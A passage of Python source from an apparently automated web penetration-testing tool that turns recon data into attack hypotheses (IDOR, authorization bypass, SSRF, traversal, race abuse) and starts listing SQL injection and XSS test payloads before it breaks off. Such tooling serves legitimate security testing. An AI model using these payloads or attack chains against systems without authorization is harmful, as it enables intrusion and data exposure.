import json
import re
from difflib import SequenceMatcher
from typing import Any
from urllib.parse import quote

from strix.tools.registry import register_tool

from .assessment_actions import record_coverage, record_evidence, record_hypothesis
from .assessment_session_actions import list_session_profiles
from .assessment_runtime_actions import list_runtime_inventory


PRIORITY_ORDER = {"critical": 0, "high": 1, "normal": 2, "low": 3}
ROLE_KEYWORDS = [
    ("superadmin", 5),
    ("admin", 4),
    ("staff", 3),
    ("manager", 3),
    ("owner", 2),
    ("member", 1),
    ("user", 1),
    ("attacker", 1),
    ("other_user", 1),
    ("guest", 0),
    ("anonymous", 0),
    ("unauth", 0),
]
OBJECT_KEYWORDS = ["id", "user", "order", "invoice", "account", "tenant", "project", "team"]
TIMING_DELTA_MS = 1200.0
MAX_HYPOTHESIS_SOURCE_ITEMS = 6
REDIRECT_PARAM_MARKERS = ("callback", "next", "redirect", "return", "target", "url", "uri")
FILE_PARAM_MARKERS = ("file", "path")
OBJECT_PARAM_MARKERS = ("account", "id", "member", "org", "organization", "project", "team", "tenant", "user")
ROLE_HINT_MARKERS = ("admin", "owner", "permission", "privilege", "role", "scope")
FEATURE_HINT_MARKERS = ("beta", "debug", "feature", "flag", "internal", "preview", "toggle")
SECRET_HINT_MARKERS = ("api", "auth", "client", "csrf", "key", "password", "secret", "session", "token")


def _normalize_marker_list(values: list[Any] | None) -> list[str]:
    if values is None:
        raw_values: list[Any] = []
    elif isinstance(values, list):
        raw_values = list(values)
    else:
        raw_values = [values]

    normalized: list[str] = []
    seen: set[str] = set()
    for item in raw_values:
        candidate = str(item or "").strip()
        if not candidate:
            continue
        lowered = candidate.lower()
        if lowered in seen:
            continue
        seen.add(lowered)
        normalized.append(candidate)
    return normalized


def _priority_name(*values: str) -> str:
    candidates = [value for value in values if value in PRIORITY_ORDER]
    if not candidates:
        return "normal"
    return min(candidates, key=lambda item: PRIORITY_ORDER.get(item, 2))


def _focus_candidates_for_vulnerability_type(vulnerability_type: str) -> list[str]:
    normalized = str(vulnerability_type or "").strip().lower()
    mapping = {
        "authentication": ["auth_jwt"],
        "authorization": ["authz"],
        "business_logic": [],
        "idor": ["authz"],
        "jwt": ["auth_jwt"],
        "open_redirect": ["open_redirect"],
        "path_traversal": ["path_traversal"],
        "race_condition": ["workflow_race"],
        "sqli": ["sqli"],
        "ssrf": ["ssrf_oob"],
        "ssti": ["ssti"],
        "xss": ["xss"],
        "xxe": ["xxe"],
    }
    return list(mapping.get(normalized, []))


def _candidate_url(host: str, path: str) -> str | None:
    normalized_host = str(host or "").strip()
    normalized_path = str(path or "").strip()
    if not normalized_host or not normalized_path:
        return None
    return f"https://{normalized_host}{normalized_path}"


def _path_parameter_hints(path: str) -> list[str]:
    hints: list[str] = []
    for candidate in re.findall(r":([A-Za-z0-9_]+)", str(path or "")):
        normalized = str(candidate).strip()
        if normalized and normalized not in hints:
            hints.append(normalized)
    for candidate in re.findall(r"{([^}/]+)}", str(path or "")):
        normalized = str(candidate).strip()
        if normalized and normalized not in hints:
            hints.append(normalized)
    return hints


def _runtime_entry_parameter_names(entry: dict[str, Any]) -> list[str]:
    return _unique_strings(
        [
            *[str(item) for item in list(entry.get("query_params") or [])],
            *[str(item) for item in list(entry.get("body_params") or [])],
            *[str(item) for item in list(entry.get("path_params") or [])],
            *[str(item) for item in list(entry.get("header_params") or [])],
        ]
    )


def _runtime_candidate_urls(
    runtime_inventory: list[dict[str, Any]],
    *,
    host: str,
    parameter_names: list[str] | None = None,
    path_keywords: list[str] | None = None,
    max_items: int = 4,
) -> list[str]:
    normalized_host = str(host or "").strip().lower()
    parameter_needles = [str(item).strip().lower() for item in (parameter_names or []) if str(item).strip()]
    path_needles = [str(item).strip().lower() for item in (path_keywords or []) if str(item).strip()]
    candidate_urls: list[str] = []

    for entry in runtime_inventory:
        if not isinstance(entry, dict):
            continue
        entry_host = str(entry.get("host") or "").strip().lower()
        if normalized_host and entry_host and entry_host != normalized_host:
            continue

        entry_path = str(entry.get("normalized_path") or "").strip()
        entry_path_lower = entry_path.lower()
        entry_parameters = [item.lower() for item in _runtime_entry_parameter_names(entry)]
        parameter_match = not parameter_needles or any(
            any(needle in parameter or parameter in needle for needle in parameter_needles)
            for parameter in entry_parameters
        )
        path_match = not path_needles or any(keyword in entry_path_lower for keyword in path_needles)
        if parameter_needles and path_needles:
            if not parameter_match and not path_match:
                continue
        elif parameter_needles:
            if not parameter_match:
                continue
        elif path_needles:
            if not path_match:
                continue
        elif not entry_path:
            continue

        for sample_url in list(entry.get("sample_urls") or []):
            candidate = str(sample_url or "").strip()
            if candidate:
                candidate_urls.append(candidate)
        direct_url = _candidate_url(entry.get("host") or host, entry_path)
        if direct_url:
            candidate_urls.append(direct_url)
        if len(_unique_strings(candidate_urls)) >= max_items:
            break

    return _unique_strings(candidate_urls)[:max_items]


def _surface_candidate_urls_for_host(
    artifacts: list[dict[str, Any]],
    *,
    host: str,
    max_items: int = 4,
) -> list[str]:
    normalized_host = str(host or "").strip().lower()
    candidate_urls: list[str] = []
    for artifact in artifacts:
        if not isinstance(artifact, dict):
            continue
        artifact_host = str(artifact.get("host") or "").strip().lower()
        if normalized_host and artifact_host and artifact_host != normalized_host:
            continue
        kind = str(artifact.get("kind") or "").strip().lower()
        if kind in {"source_map", "js_asset"}:
            continue
        candidate = _candidate_url(str(artifact.get("host") or host), str(artifact.get("path") or ""))
        if candidate:
            candidate_urls.append(candidate)
        if kind == "openapi_spec":
            for operation in list(artifact.get("documented_operations") or []):
                if not isinstance(operation, dict):
                    continue
                operation_candidate = _candidate_url(
                    str(artifact.get("host") or host),
                    str(operation.get("path") or ""),
                )
                if operation_candidate:
                    candidate_urls.append(operation_candidate)
        if len(_unique_strings(candidate_urls)) >= max_items:
            break
    return _unique_strings(candidate_urls)[:max_items]


def _safe_list_runtime_inventory(agent_state: Any, target: str) -> list[dict[str, Any]]:
    result = list_runtime_inventory(
        agent_state=agent_state,
        target=target,
        include_inventory=True,
        max_items=1,
    )
    if not result.get("success"):
        return []
    records = result.get("records", [])
    if not records:
        return []
    return list(records[0].get("inventory", []))


def _safe_list_surface_artifacts(agent_state: Any, target: str) -> list[dict[str, Any]]:
    try:
        from .assessment_surface_actions import list_mined_attack_surface
    except ImportError:
        return []

    result = list_mined_attack_surface(
        agent_state=agent_state,
        target=target,
        include_artifacts=True,
        max_items=1,
    )
    if not result.get("success"):
        return []
    records = result.get("records", [])
    if not records:
        return []
    return list(records[0].get("artifacts", []))


def _safe_list_workflows(agent_state: Any, target: str) -> list[dict[str, Any]]:
    try:
        from .assessment_workflow_actions import list_discovered_workflows
    except ImportError:
        return []

    result = list_discovered_workflows(
        agent_state=agent_state,
        target=target,
        include_workflows=True,
        max_items=1,
    )
    if not result.get("success"):
        return []
    records = result.get("records", [])
    if not records:
        return []
    return list(records[0].get("workflows", []))


def _safe_list_assessment_state(agent_state: Any) -> dict[str, Any]:
    from .assessment_actions import list_assessment_state

    result = list_assessment_state(
        agent_state=agent_state,
        include_resolved_coverage=False,
        include_evidence=False,
        max_items=200,
    )
    if not result.get("success"):
        return {"coverage": [], "hypotheses": []}
    return result


def _role_rank(name: str) -> int | None:
    lowered = name.lower()
    for keyword, rank in ROLE_KEYWORDS:
        if keyword in lowered:
            return rank
    return None


def _suspicious_object_path(path: str) -> bool:
    lowered = path.lower()
    return ":" in lowered or any(keyword in lowered for keyword in OBJECT_KEYWORDS)


def _marker_hits(values: list[Any] | None, markers: tuple[str, ...]) -> list[str]:
    hits: list[str] = []
    for value in _normalize_marker_list(values):
        lowered = value.lower()
        if any(marker in lowered for marker in markers):
            hits.append(value)
    return hits


def _unique_strings(values: list[str]) -> list[str]:
    deduped: list[str] = []
    seen: set[str] = set()
    for value in values:
        candidate = str(value or "").strip()
        if not candidate or candidate.lower() in seen:
            continue
        seen.add(candidate.lower())
        deduped.append(candidate)
    return deduped


def _artifact_hint_summary(artifact: dict[str, Any]) -> dict[str, list[str]]:
    role_hints = _marker_hits(
        [*list(artifact.get("role_hints") or []), *list(artifact.get("hint_names") or [])],
        ROLE_HINT_MARKERS,
    )
    object_hints = _marker_hits(
        [*list(artifact.get("object_hints") or []), *list(artifact.get("param_hints") or [])],
        tuple(OBJECT_KEYWORDS + list(OBJECT_PARAM_MARKERS)),
    )
    redirect_hints = _marker_hits(list(artifact.get("param_hints") or []), REDIRECT_PARAM_MARKERS)
    file_hints = _marker_hits(list(artifact.get("param_hints") or []), FILE_PARAM_MARKERS)
    feature_hints = _marker_hits(
        [*list(artifact.get("feature_hints") or []), *list(artifact.get("hint_names") or [])],
        FEATURE_HINT_MARKERS,
    )
    secret_hints = _marker_hits(
        [*list(artifact.get("secret_hints") or []), *list(artifact.get("hint_names") or [])],
        SECRET_HINT_MARKERS,
    )
    source_files = _normalize_marker_list(list(artifact.get("source_files") or []))
    return {
        "role_hints": role_hints,
        "object_hints": object_hints,
        "redirect_hints": redirect_hints,
        "file_hints": file_hints,
        "feature_hints": feature_hints,
        "secret_hints": secret_hints,
        "source_files": source_files,
    }


def _preview_similarity(left: str, right: str) -> float:
    if not left or not right:
        return 0.0
    return SequenceMatcher(None, left, right).ratio()


def _top_issue_type(issue_types: list[str]) -> str:
    if "blind_interaction" in issue_types:
        return "blind_interaction"
    if "authorization_parity" in issue_types:
        return "authorization_parity"
    if "dangerous_variant_acceptance" in issue_types:
        return "dangerous_variant_acceptance"
    if "semantic_indicator" in issue_types:
        return "semantic_indicator"
    if "timing_oracle" in issue_types:
        return "timing_oracle"
    if "sensitive_redirect" in issue_types:
        return "sensitive_redirect"
    return issue_types[0] if issue_types else "generic_anomaly"


def _vulnerability_type_for_issue(issue_type: str) -> str:
    return {
        "blind_interaction": "ssrf",
        "authorization_parity": "authorization",
        "dangerous_variant_acceptance": "anomaly",
        "timing_oracle": "side_channel",
        "sensitive_redirect": "open_redirect",
        "length_outlier": "anomaly",
    }.get(issue_type, "anomaly")


def _status_indicates_success(status_code: Any) -> bool:
    try:
        normalized = int(status_code)
    except (TypeError, ValueError):
        return False
    return 200 <= normalized < 400


def _runtime_hypotheses(
    inventory: list[dict[str, Any]],
    session_count: int,
) -> list[dict[str, Any]]:
    if session_count < 2:
        return []

    candidates: list[dict[str, Any]] = []
    for item in inventory[:MAX_HYPOTHESIS_SOURCE_ITEMS]:
        methods = list(item.get("methods", []))
        path = str(item.get("normalized_path", ""))
        host = str(item.get("host", ""))
        if not methods or not path or not host:
            continue

        for method in methods[:2]:
            state_changing = method in {"POST", "PUT", "PATCH", "DELETE"}
            if state_changing or _suspicious_object_path(path):
                vulnerability_type = "idor" if _suspicious_object_path(path) else "authorization"
                priority = _priority_name(
                    str(item.get("priority", "normal")),
                    "critical" if state_changing else "high",
                )
                direct_url = _candidate_url(host, path)
                candidate_urls = _unique_strings(
                    [
                        *[
                            str(sample).strip()
                            for sample in list(item.get("sample_urls") or [])
                            if str(sample).strip()
                        ],
                        *([direct_url] if direct_url else []),
                    ]
                )
                parameter_names = _unique_strings(
                    [
                        *_runtime_entry_parameter_names(item),
                        *_path_parameter_hints(path),
                    ]
                )
                candidates.append(
                    {
                        "hypothesis": (
                            f"Authorization may break on {method} {path} across roles or tenants on {host}"
                        ),
                        "host": host,
                        "path": path,
                        "component": f"runtime:{host}",
                        "vulnerability_type": vulnerability_type,
                        "priority": priority,
                        "rationale": (
                            f"Runtime inventory marked {method} {path} as {item.get('priority', 'normal')} "
                            f"and {session_count} reusable session profiles are available for cross-context replay."
                        ),
                        "attack_chain": [
                            f"Replay {method} {path} with owner, other-user, guest, and admin sessions",
                            "Swap object IDs, tenant markers, and related references while keeping valid auth",
                            (
                                "If the operation is state-changing, combine cross-context replay with race "
                                "or workflow drift probes"
                            ),
                        ],
                        "signals": [f"runtime:{host}:{method}:{path}"],
                        "candidate_urls": candidate_urls,
                        "parameter_names": parameter_names,
                        "focus_candidates": _focus_candidates_for_vulnerability_type(vulnerability_type),
                        "validation_strategy": "inventory_differential_replay",
                        "needs_more_data": False,
                    }
                )
    return candidates


def _surface_hypotheses(
    artifacts: list[dict[str, Any]],
    runtime_inventory: list[dict[str, Any]],
) -> list[dict[str, Any]]:
    candidates: list[dict[str, Any]] = []
    runtime_paths = {
        (method, str(item.get("normalized_path", "")))
        for item in runtime_inventory
        for method in item.get("methods", [])
    }

    for artifact in artifacts[: MAX_HYPOTHESIS_SOURCE_ITEMS * 2]:
        kind = str(artifact.get("kind", ""))
        host = str(artifact.get("host", ""))
        path = str(artifact.get("path", ""))
        if not host or not path:
            continue
        artifact_url = _candidate_url(host, path)

        if kind == "openapi_spec":
            missing_ops = [
                op
                for op in artifact.get("documented_operations", [])
                if (str(op.get("method", "ANY")), str(op.get("path", ""))) not in runtime_paths
            ]
            if missing_ops:
                operation = missing_ops[0]
                operation_path = str(operation.get("path", "")).strip()
                operation_url = _candidate_url(host, operation_path)
                candidates.append(
                    {
                        "hypothesis": (
                            f"Documented but unobserved endpoint {operation['method']} {operation['path']} "
                            f"may expose hidden privileged functionality on {host}"
                        ),
                        "host": host,
                        "path": operation_path,
                        "component": f"spec:{host}",
                        "vulnerability_type": "authorization",
                        "priority": "high",
                        "rationale": (
                            f"OpenAPI/Swagger mining found documented routes not yet present in runtime inventory "
                            f"for host {host}."
                        ),
                        "attack_chain": [
                            "Invoke the documented operation directly with low-privilege and high-privilege sessions",
                            "Compare whether documentation-only routes bypass middleware, routing, or feature-flag checks",
                        ],
                        "signals": [f"openapi:{host}:{path}"],
                        "candidate_urls": [operation_url] if operation_url else [],
                        "parameter_names": _path_parameter_hints(operation_path),
                        "focus_candidates": ["authz"],
                        "validation_strategy": "documented_route_replay",
                        "needs_more_data": operation_url is None,
                    }
                )

        if kind == "graphql_endpoint":
            candidates.append(
                {
                    "hypothesis": f"GraphQL resolvers on {path} may leak cross-user or cross-tenant data on {host}",
                    "host": host,
                    "path": path,
                    "component": f"surface:{host}",
                    "vulnerability_type": "authorization",
                    "priority": "high",
                    "rationale": (
                        "GraphQL endpoints expand attack surface beyond route-level checks and often hide "
                        "field-level authorization drift."
                    ),
                    "attack_chain": [
                        "Enumerate operations or reuse observed persisted queries",
                        "Replay the same object or node access with alternate sessions and compare partial field exposure",
                    ],
                    "signals": [f"graphql:{host}:{path}"],
                    "candidate_urls": [artifact_url] if artifact_url else [],
                    "parameter_names": [],
                    "focus_candidates": ["authz"],
                    "validation_strategy": "graphql_role_replay",
                    "needs_more_data": artifact_url is None,
                }
            )

        if kind == "graphql_persisted_query":
            candidates.append(
                {
                    "hypothesis": f"Persisted query routing on {path} may expose resolver paths that normal traffic does not surface",
                    "host": host,
                    "path": path,
                    "component": f"surface:{host}",
                    "vulnerability_type": "authorization",
                    "priority": "high",
                    "rationale": (
                        "Persisted query hints often reveal alternate execution paths or operation IDs that bypass shallow route testing."
                    ),
                    "attack_chain": [
                        "Replay observed hashes and operation names with alternate variables or object IDs",
                        "Compare authorization behavior against equivalent REST or GraphQL operations",
                    ],
                    "signals": [f"persisted_query:{host}:{path}"],
                    "candidate_urls": [artifact_url] if artifact_url else [],
                    "parameter_names": [],
                    "focus_candidates": ["authz"],
                    "validation_strategy": "graphql_persisted_query_replay",
                    "needs_more_data": artifact_url is None,
                }
            )

        if kind == "websocket_endpoint":
            candidates.append(
                {
                    "hypothesis": f"WebSocket authorization on {path} may drift from equivalent HTTP enforcement on {host}",
                    "host": host,
                    "path": path,
                    "component": f"surface:{host}",
                    "vulnerability_type": "authorization",
                    "priority": "high",
                    "rationale": (
                        "Realtime channels often reuse business actions without the same guard stack as HTTP handlers."
                    ),
                    "attack_chain": [
                        "Establish low-privilege and high-privilege socket sessions to the same channel or topic",
                        "Subscribe or publish using foreign IDs, tenant names, or guessed topic keys",
                    ],
                    "signals": [f"websocket:{host}:{path}"],
                    "candidate_urls": [],
                    "parameter_names": [],
                    "focus_candidates": ["authz"],
                    "validation_strategy": "socket_channel_replay",
                    "needs_more_data": True,
                }
            )

        hint_summary = _artifact_hint_summary(artifact)
        role_hints = list(hint_summary["role_hints"])
        object_hints = list(hint_summary["object_hints"])
        redirect_hints = list(hint_summary["redirect_hints"])
        file_hints = list(hint_summary["file_hints"])
        feature_hints = list(hint_summary["feature_hints"])
        secret_hints = list(hint_summary["secret_hints"])
        source_files = list(hint_summary["source_files"])

        if kind == "js_route":
            hidden_or_unobserved = ("GET", path) not in runtime_paths and ("ANY", path) not in runtime_paths
            looks_privileged = any(marker in path.lower() for marker in ["/admin", "/internal", "/billing", "/report"])
            if hidden_or_unobserved or looks_privileged:
                vulnerability_type = "idor" if _suspicious_object_path(path) else "authorization"
                candidates.append(
                    {
                        "hypothesis": (
                            f"Hidden route {path} may expose undocumented authorization or object access on {host}"
                        ),
                        "host": host,
                        "path": path,
                        "component": f"surface:{host}",
                        "vulnerability_type": vulnerability_type,
                        "priority": "critical" if looks_privileged else "high",
                        "rationale": (
                            f"Browser-mined route {path} was inferred from asset content and is "
                            f"{'not yet present in runtime inventory' if hidden_or_unobserved else 'associated with a privileged-looking path'}."
                        ),
                        "attack_chain": [
                            "Request the hidden route directly with guest, user, owner, and admin contexts",
                            "Swap any object IDs, tenant markers, or role-linked parameters while keeping a valid session",
                            "Compare whether the hidden route reaches deeper state or object visibility than the visible UI",
                        ],
                        "signals": [f"js_route:{host}:{path}"],
                        "candidate_urls": [artifact_url] if artifact_url else [],
                        "parameter_names": _path_parameter_hints(path),
                        "focus_candidates": _focus_candidates_for_vulnerability_type(vulnerability_type),
                        "validation_strategy": "hidden_route_direct_replay",
                        "needs_more_data": artifact_url is None,
                    }
                )

        if kind == "source_map":
            if role_hints or object_hints or source_files:
                auth_candidate_urls = _unique_strings(
                    [
                        *_runtime_candidate_urls(
                            runtime_inventory,
                            host=host,
                            parameter_names=object_hints,
                            path_keywords=[*role_hints[:2], *object_hints[:2]],
                        ),
                        *_surface_candidate_urls_for_host(artifacts, host=host),
                    ]
                )
                vulnerability_type = "idor" if object_hints else "authorization"
                candidates.append(
                    {
                        "hypothesis": (
                            f"Source map {path} may reveal hidden privileged object flows that break authz on {host}"
                        ),
                        "host": host,
                        "path": path,
                        "component": f"surface:{host}",
                        "vulnerability_type": vulnerability_type,
                        "priority": "critical" if role_hints and object_hints else "high",
                        "rationale": (
                            "Source map metadata exposed "
                            f"roles={role_hints[:3] or ['needs more data']}, "
                            f"objects={object_hints[:3] or ['needs more data']}, "
                            f"sources={source_files[:3] or ['needs more data']}."
                        ),
                        "attack_chain": [
                            "Use the leaked route/object context to request undocumented endpoints directly",
                            "Compare ownership, tenant isolation, and field exposure across low and high privilege sessions",
                            "Treat leaked role or object names as pivots for BOLA, field-level auth, and hidden admin UI states",
                        ],
                        "signals": [
                            f"source_map:{host}:{path}",
                            *[f"role_hint:{item}" for item in role_hints[:3]],
                            *[f"object_hint:{item}" for item in object_hints[:3]],
                        ],
                        "candidate_urls": auth_candidate_urls,
                        "parameter_names": object_hints[:4],
                        "focus_candidates": _focus_candidates_for_vulnerability_type(vulnerability_type),
                        "validation_strategy": (
                            "route_replay_with_object_swap"
                            if auth_candidate_urls
                            else "needs_runtime_sink_mapping"
                        ),
                        "needs_more_data": not auth_candidate_urls,
                    }
                )
            if redirect_hints:
                redirect_vulnerability = (
                    "ssrf" if any("callback" in item.lower() for item in redirect_hints) else "open_redirect"
                )
                redirect_candidate_urls = _runtime_candidate_urls(
                    runtime_inventory,
                    host=host,
                    parameter_names=redirect_hints,
                )
                candidates.append(
                    {
                        "hypothesis": (
                            f"Source map {path} suggests redirect or callback trust on {host} that may allow SSRF or open redirect"
                        ),
                        "host": host,
                        "path": path,
                        "component": f"surface:{host}",
                        "vulnerability_type": redirect_vulnerability,
                        "priority": "high",
                        "rationale": (
                            f"Source map parameter hints exposed redirect-like names {redirect_hints[:4]}, which often map to callback or return URL trust boundaries."
                        ),
                        "attack_chain": [
                            "Locate requests or forms that consume the hinted callback/redirect parameters",
                            "Try same-origin, cross-origin, and out-of-band callback values while preserving valid workflow state",
                            "Check whether redirects, fetches, or server-side webhooks accept attacker-controlled destinations",
                        ],
                        "signals": [f"source_map_redirect:{host}:{path}", *[f"param_hint:{item}" for item in redirect_hints[:4]]],
                        "candidate_urls": redirect_candidate_urls,
                        "parameter_names": redirect_hints[:4],
                        "focus_candidates": _focus_candidates_for_vulnerability_type(redirect_vulnerability),
                        "validation_strategy": (
                            "parameter_probe_with_redirect_payloads"
                            if redirect_candidate_urls
                            else "needs_runtime_sink_mapping"
                        ),
                        "needs_more_data": not redirect_candidate_urls,
                    }
                )
            if file_hints:
                file_candidate_urls = _runtime_candidate_urls(
                    runtime_inventory,
                    host=host,
                    parameter_names=file_hints,
                )
                candidates.append(
                    {
                        "hypothesis": (
                            f"Source map {path} suggests file or path handling on {host} that may allow traversal or unauthorized file access"
                        ),
                        "host": host,
                        "path": path,
                        "component": f"surface:{host}",
                        "vulnerability_type": "path_traversal",
                        "priority": "high",
                        "rationale": (
                            f"Source map parameter hints exposed file/path-like names {file_hints[:4]}, which often indicate download, export, or import boundaries."
                        ),
                        "attack_chain": [
                            "Find the hinted file/path parameters in requests, forms, or hidden endpoints",
                            "Probe relative traversal, absolute paths, and foreign object keys under valid authenticated context",
                            "Check whether signed URLs, export paths, or attachment fetches cross object ownership boundaries",
                        ],
                        "signals": [f"source_map_file:{host}:{path}", *[f"param_hint:{item}" for item in file_hints[:4]]],
                        "candidate_urls": file_candidate_urls,
                        "parameter_names": file_hints[:4],
                        "focus_candidates": ["path_traversal"],
                        "validation_strategy": (
                            "parameter_probe_with_file_payloads"
                            if file_candidate_urls
                            else "needs_runtime_sink_mapping"
                        ),
                        "needs_more_data": not file_candidate_urls,
                    }
                )
            if secret_hints or feature_hints:
                candidates.append(
                    {
                        "hypothesis": (
                            f"Source map {path} may leak feature-flag or secret-bearing client context that unlocks hidden attack surface on {host}"
                        ),
                        "host": host,
                        "path": path,
                        "component": f"surface:{host}",
                        "vulnerability_type": "secret_exposure" if secret_hints else "business_logic",
                        "priority": "high",
                        "rationale": (
                            f"Source map hints exposed features={feature_hints[:3] or ['needs more data']} "
                            f"and secrets/config names={secret_hints[:3] or ['needs more data']}."
                        ),
                        "attack_chain": [
                            "Trace where the leaked flag or secret names appear in runtime requests, JS state, or hidden routes",
                            "Check whether toggles unlock admin, beta, internal, or cross-tenant behaviors client-side only",
                            "Verify whether any leaked config names correspond to privilege-bearing headers, tokens, or callback endpoints",
                        ],
                        "signals": [
                            f"source_map_exposure:{host}:{path}",
                            *[f"feature_hint:{item}" for item in feature_hints[:3]],
                            *[f"secret_hint:{item}" for item in secret_hints[:3]],
                        ],
                        "candidate_urls": _surface_candidate_urls_for_host(artifacts, host=host),
                        "parameter_names": _unique_strings([*feature_hints[:3], *secret_hints[:3]]),
                        "focus_candidates": _focus_candidates_for_vulnerability_type(
                            "secret_exposure" if secret_hints else "business_logic"
                        ),
                        "validation_strategy": "feature_toggle_trace",
                        "needs_more_data": True,
                    }
                )

        if kind == "js_asset" and feature_hints:
            candidates.append(
                {
                    "hypothesis": (
                        f"JavaScript bundle {path} may gate hidden beta or internal flows on {host} with client-side feature checks"
                    ),
                    "host": host,
                    "path": path,
                    "component": f"surface:{host}",
                    "vulnerability_type": "business_logic",
                    "priority": "high",
                    "rationale": (
                        f"Bundle metadata exposed feature-like hints {feature_hints[:4]}, which often correspond to hidden routes or weak client-enforced controls."
                    ),
                    "attack_chain": [
                        "Toggle or replay feature-linked requests with and without the expected client-side state",
                        "Check whether hidden routes or APIs respond even when the visible UI does not expose the feature",
                    ],
                    "signals": [f"js_asset_feature:{host}:{path}", *[f"feature_hint:{item}" for item in feature_hints[:4]]],
                    "candidate_urls": _surface_candidate_urls_for_host(artifacts, host=host),
                    "parameter_names": feature_hints[:4],
                    "focus_candidates": [],
                    "validation_strategy": "feature_toggle_trace",
                    "needs_more_data": True,
                }
            )
    return candidates


def _workflow_hypotheses(workflows: list[dict[str, Any]]) -> list[dict[str, Any]]:
    candidates: list[dict[str, Any]] = []
    for workflow in workflows[:MAX_HYPOTHESIS_SOURCE_ITEMS]:
        sequence = list(workflow.get("sequence", []))
        if not sequence:
            continue
        host = str(workflow.get("host", ""))
        repeated_write = bool(workflow.get("repeated_write"))
        workflow_type = str(workflow.get("type", "state_machine"))
        component = f"workflow:{host}" if host else "workflow"
        path_summary = " -> ".join(
            f"{step.get('method', 'ANY')} {step.get('normalized_path', '/')}"
            for step in sequence[:4]
        )
        vulnerability_type = (
            "race_condition"
            if repeated_write
            or workflow_type in {"checkout", "payment", "wallet", "transfer", "coupon", "redeem"}
            else "business_logic"
        )
        candidate_urls = _unique_strings(
            [
                candidate
                for candidate in (
                    _candidate_url(host, str(step.get("normalized_path") or ""))
                    for step in sequence[:4]
                )
                if candidate
            ]
        )
        candidates.append(
            {
                "hypothesis": (
                    f"Workflow {workflow_type} may allow replay, skipped-step progression, or race abuse on {host or 'target'}"
                ),
                "host": host,
                "path": str(sequence[-1].get("normalized_path", "/")) if sequence else "/",
                "component": component,
                "vulnerability_type": vulnerability_type,
                "priority": _priority_name(str(workflow.get("priority", "normal")), "high"),
                "rationale": f"Workflow reconstruction found multi-step state transitions: {path_summary}.",
                "attack_chain": [
                    "Skip intermediate steps and replay the final state-changing request directly",
                    "Run the workflow concurrently or reuse the same token/object to probe single-use violations",
                ],
                "signals": [f"workflow:{host}:{workflow_type}"],
                "candidate_urls": candidate_urls,
                "parameter_names": [],
                "focus_candidates": _focus_candidates_for_vulnerability_type(vulnerability_type),
                "validation_strategy": (
                    "workflow_race_replay"
                    if vulnerability_type == "race_condition"
                    else "workflow_state_transition_review"
                ),
                "needs_more_data": vulnerability_type != "race_condition" and not candidate_urls,
            }
        )
    return candidates


def _dedupe_hypotheses(
    hypotheses: list[dict[str, Any]],
    existing: list[dict[str, Any]],
    *,
    include_existing_open: bool,
) -> list[dict[str, Any]]:
    seen_existing = {
        (
            str(item.get("hypothesis", "")).strip().lower(),
            str(item.get("component", "")).strip().lower(),
            str(item.get("vulnerability_type", "")).strip().lower(),
        )
        for item in existing
        if str(item.get("status", "")).lower() in {"open", "in_progress", "validated"}
    }
    deduped: list[dict[str, Any]] = []
    seen_new: set[tuple[str, str, str]] = set()

    for item in hypotheses:
        key = (
            str(item.get("hypothesis", "")).strip().lower(),
            str(item.get("component", "")).strip().lower(),
            str(item.get("vulnerability_type", "")).strip().lower(),
        )
        if key in seen_new:
            continue
        if not include_existing_open and key in seen_existing:
            continue
        seen_new.add(key)
        deduped.append(item)
    return deduped


@register_tool(sandbox_execution=False)
def synthesize_attack_hypotheses(
    agent_state: Any,
    target: str,
    max_hypotheses: int = 12,
    persist: bool = True,
    include_existing_open: bool = False,
) -> dict[str, Any]:
    try:
        if max_hypotheses < 1:
            raise ValueError("max_hypotheses must be >= 1")

        runtime_inventory = _safe_list_runtime_inventory(agent_state, target)
        surface_artifacts = _safe_list_surface_artifacts(agent_state, target)
        workflows = _safe_list_workflows(agent_state, target)
        session_profiles = list_session_profiles(
            agent_state=agent_state,
            include_values=False,
            max_items=100,
        )
        assessment_state = _safe_list_assessment_state(agent_state)

        session_count = int(session_profiles.get("profile_count") or 0)
        hypotheses = []
        hypotheses.extend(_runtime_hypotheses(runtime_inventory, session_count))
        hypotheses.extend(_surface_hypotheses(surface_artifacts, runtime_inventory))
        hypotheses.extend(_workflow_hypotheses(workflows))
        hypotheses = _dedupe_hypotheses(
            hypotheses,
            list(assessment_state.get("hypotheses", [])),
            include_existing_open=include_existing_open,
        )
        hypotheses.sort(
            key=lambda item: (
                PRIORITY_ORDER.get(str(item.get("priority", "normal")), 2),
                str(item.get("component", "")),
                str(item.get("hypothesis", "")),
            )
        )
        selected = hypotheses[:max_hypotheses]
        if not selected:
            return {
                "success": False,
                "error": "No new synthesized attack hypotheses were produced from the current assessment state",
            }

        persisted_records = []
        if persist:
            for item in selected:
                result = record_hypothesis(
                    agent_state=agent_state,
                    hypothesis=str(item["hypothesis"]),
                    target=target,
                    component=str(item["component"]),
                    vulnerability_type=str(item["vulnerability_type"]),
                    status="open",
                    priority=str(item["priority"]),
                    rationale=str(item["rationale"]),
                )
                if result.get("success"):
                    item["hypothesis_id"] = result.get("hypothesis_id")
                    persisted_records.append(result.get("record"))

        evidence_result = record_evidence(
            agent_state=agent_state,
            title=f"Synthesized attack hypotheses for {target}",
            details=json.dumps({"hypotheses": selected}, ensure_ascii=False),
            source="tool",
            target=target,
            component="creative_hunter",
        )

    except (TypeError, ValueError) as e:
        return {"success": False, "error": f"Failed to synthesize attack hypotheses: {e}"}
    else:
        return {
            "success": True,
            "hypothesis_count": len(selected),
            "hypotheses": selected,
            "persisted_count": len(persisted_records),
            "evidence_result": evidence_result,
        }


def _payload_variants_for_type(
    vulnerability_type: str,
    *,
    callback_urls: list[str],
) -> list[dict[str, Any]]:
    payloads: list[dict[str, Any]] = []

    if vulnerability_type == "idor":
        for payload in ["1", "2", "9999", "../1", "0001", "self", "me", "admin"]:
            payloads.append({"payload": payload, "strategy": "object_reference_swap"})
    elif vulnerability_type == "sqli":
        for payload in [
            "'",
            "\"",
            "' OR '1'='1",
            "' AND 1=2--",
            "' OR SLEEP(5)--",
            "';WAITFOR DELAY '0:0:5'--",
            "'||(SELECT pg_sleep(5))||'",
        ]:
            payloads.append({"payload": payload, "strategy": "syntax_and_time_based"})
    elif vulnerability_type == "xss":
        for payload in [
            {
                "payload": "<svg/onload=alert(1)>",
                "strategy": "dom_and_template_xss",
                "expected_markers": ["<svg", "onload=alert(1)", "alert(1)"],
            },
            {
                "payload": "\"><svg/onload=alert(1)>",
                "strategy": "dom_breakout_xss",
                "expected_markers": ["<svg", "onload=alert(1)", "alert(1)"],
            },
            {
                "payload": "<img src=x onerror=alert(document.domain)>",
